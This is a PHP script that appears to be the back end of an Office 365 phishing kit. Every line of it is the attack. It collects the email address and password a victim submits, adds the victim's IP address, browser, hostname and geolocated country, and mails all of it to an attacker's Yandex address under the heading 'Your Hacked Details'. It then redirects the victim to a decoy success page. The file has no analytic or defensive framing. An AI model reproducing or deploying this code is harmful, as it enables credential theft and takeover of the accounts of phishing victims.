<?php
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$country = visitor_country();
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "*****************Your Hacked Details*****************\n";
$message .= "Email Address:             : ".$_POST['ai']."\n";
$kiss = $_POST['ai'];
$om = $_POST['pink'];
$message .= "Password:             : ".$_POST['pr']."\n";
$message .= "***************HISTORY***************\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "************************YSL SLATT************************\n";
$send = "logz2022@yandex.ru";
$subject = "OFFICE365 | $country | $ip";
$headers = "From: Off new";
$headers .= $_POST['stress']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
function visitor_country()
	{
	$ip = getenv("REMOTE_ADDR");
	$result = "Unknown";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$country = json_decode(curl_exec($ch))->country;
	if ($country != null)
		{
		$result = $country;
		}

	return $result;
	}


	
	   header("Location: https://lingaly.pl/s/IK/of1/success.php");

	 
?>
